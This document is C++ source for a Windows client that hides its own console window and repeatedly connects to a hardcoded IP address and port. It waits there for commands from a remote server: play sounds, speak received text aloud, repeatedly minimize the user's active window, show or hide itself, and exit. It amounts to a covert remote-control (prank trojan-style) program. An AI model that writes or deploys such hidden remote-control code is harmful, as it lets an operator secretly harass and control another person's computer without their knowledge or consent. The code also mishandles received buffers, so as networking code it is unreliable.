#include <iostream>
#include <string>
#include <ws2tcpip.h>
#include <sapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment( lib, "Winmm.lib" )

using namespace std;

const string ipAddress = "192.168.88.254";

//192.168.88.254
//95.84.240.23

bool ServerCheck(SOCKET s) {
	char msg[8];
	string checkmsg = "olleh";
	int sr = send(s, checkmsg.c_str(), checkmsg.size() + 1, 0);
	if (sr != SOCKET_ERROR) {
		ZeroMemory(msg, 8);
		int bytesRecieved = recv(s, msg, 8, 0);
		if (string(msg, 0, bytesRecieved) == "hello") {
			return true;
		}
		else return false;
	}
	else return false;
}

std::wstring s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

enum startopt {
	idle,
	makerrsound,
	read,
	criterr,
	hide,
	show,
	quitcl,
	bruh,
	minw,
	minwt,
};

startopt RequestAction(SOCKET s) {
	char msg[8];
	string checkmsg = "action";
	int sr = send(s, checkmsg.c_str(), checkmsg.size() + 1, 0);
	if (sr != SOCKET_ERROR) {
		ZeroMemory(msg, 8);
		int bytesRecieved = recv(s, msg, 8, 0);
		if (string(msg, 0, bytesRecieved) == "mkerrs") return makerrsound;
		if (string(msg, 0, bytesRecieved) == "read") return read;
		if (string(msg, 0, bytesRecieved) == "idle") return idle;
		if (string(msg, 0, bytesRecieved) == "show") return show;
		if (string(msg, 0, bytesRecieved) == "hide") return hide;
		if (string(msg, 0, bytesRecieved) == "quitcl") return quitcl;
		if (string(msg, 0, bytesRecieved) == "bruh") return bruh;
		if (string(msg, 0, bytesRecieved) == "minw") return minw;
		if (string(msg, 0, bytesRecieved) == "minwt") return minwt;
		else return idle;
	}
	else return criterr;
}

bool showw = false;
int times = 0;
int timer = 0;

void main() {
	while (true) {

		if (!showw) {
			ShowWindow(GetConsoleWindow(), SW_HIDE);
		}
		else
		{
			ShowWindow(GetConsoleWindow(), SW_SHOW);
		}

		bool online = false;
		int port = 54000;
		WSAData data;
		WORD ver = MAKEWORD(2, 2);
		int wsResult = WSAStartup(ver, &data);
		if (wsResult != 0) {
			cerr << "Can't start winsock, Err #" << wsResult << endl;
			return;
		}

		SOCKET csock;

		do {
			SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
			if (sock == INVALID_SOCKET)
			{
				cerr << "Can't create socket, Err #" << WSAGetLastError() << endl;
				WSACleanup();
				return;
			}


			sockaddr_in hint;
			hint.sin_family = AF_INET;
			hint.sin_port = htons(port);
			inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

			int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
			if (connResult == SOCKET_ERROR) {
				cerr << "Can't connect to server, retrying..." << endl;
				closesocket(sock);
			}

			if (connResult != SOCKET_ERROR) {
				online = true;
				csock = sock;
				break;
			}
		} while (true);

		char buf[4096];
		string userInput;

		//debug console messages
		do {
			if (ServerCheck(csock)) {
				cout << "                  =================<Server online>=================" << endl;
				online = true;
			}
			else {
				cout << "Server offline. Restarting..." << endl;
				online = false;
				break;
			}
			//do stuff if server is online
			if (online) {
				//================================
				switch (RequestAction(csock))
				{
				case makerrsound: {
					cout << "Error sound" << endl;
					PlaySound(TEXT("SystemExclamation"), NULL, SND_ASYNC);
					break;
				}
				case read: {
					//using SAPI 5.0
					char toread[4096];
					string tmp;
					int bytesRecieved = 0;
					wstring input;
					bytesRecieved = recv(csock, toread, 4096, 0);	
					cout << "Reading |" << toread << "|..." << endl;
					ISpVoice* pVoice = NULL;
					if (FAILED(::CoInitialize(NULL))) {}
					HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void**)&pVoice);
					if (SUCCEEDED(hr))
					{
						tmp = string(toread);
						input = s2ws(tmp);
						pVoice->Speak(wstring(input).c_str(), 0, 0);
					}
					::CoUninitialize();
					ZeroMemory(toread, 4096); 
					break;
				}

				case show: {
					ShowWindow(GetConsoleWindow(), SW_SHOW);
					showw = true;
					cout << "Hi!" << endl;
					break;
				}

				case hide: {
					ShowWindow(GetConsoleWindow(), SW_HIDE);
					break;
				}

				case quitcl: {
					cout << "Bye!" << endl;
					Sleep(5000);
					ExitProcess(EXIT_FAILURE);
					break;
				}

				case bruh: {
					cout << "BRUHing" << endl;
					PlaySound(TEXT("bruh.wav"), NULL, SND_ASYNC);
					break;
				}

				case minw: {
					HWND currw = GetForegroundWindow();
					PostMessage(currw, WM_SYSCOMMAND, SC_MINIMIZE, 0);
					currw = GetActiveWindow();
					PostMessage(currw, WM_SYSCOMMAND, SC_MINIMIZE, 0);
					cout << "Active window minimized" << endl;
					break;
				}

				case minwt: {
					char ms[256];
					string sms;
					cout << "Listening for ms parameter..." << endl;
					int bytesRecieved = recv(csock, ms, 256, 0);
					sms = ms;
					timer = stoi(sms);
					bytesRecieved = recv(csock, ms, 256, 0);
					sms = ms;
					times = stoi(sms);
					for (int i = 0; i < times; i++) {
						Sleep(timer);
						HWND currw = GetForegroundWindow();
						PostMessage(currw, WM_SYSCOMMAND, SC_MINIMIZE, 0);
						currw = GetActiveWindow();
						PostMessage(currw, WM_SYSCOMMAND, SC_MINIMIZE, 0);
						cout << "Active window minimized" << endl;
					}
					break;
				}

				default: {

					break;
				}
				}
				//================================
			}
		} while (true);
		//WSACleanup on exit
		closesocket(csock);
		WSACleanup();
	}
}